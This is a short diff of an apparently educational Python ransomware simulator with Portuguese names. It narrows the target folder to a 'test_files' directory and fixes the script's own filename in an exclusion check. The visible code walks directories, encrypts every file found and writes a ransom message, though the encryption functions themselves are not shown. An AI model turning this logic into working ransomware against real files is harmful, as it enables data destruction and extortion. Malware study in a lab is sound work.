@@ -26,7 +26,7 @@ def encontrar_arquivos(diretorio):
     for raiz, _, arquivos in os.walk(diretorio):
         for nome in arquivos:
             caminho = os.path.join(raiz, nome)
-            if nome != "rasomware.pyw" and not nome.endswith(".key"):
+            if nome != "rasomware.py" and not nome.endswith(".key"):
                 lista.append(caminho)
     return lista
 
@@ -41,7 +41,7 @@ def criar_mensagem_resgate():
 def main():
     gerar_chave()
     chave = carregar_chave()
-    arquivos = encontrar_arquivos("Malcode/ransomware_sim")
+    arquivos = encontrar_arquivos("Malcode/ransomware_sim/test_files")
     for arquivo in arquivos:
         criptografar_arquivo(arquivo, chave)
     criar_mensagem_resgate()
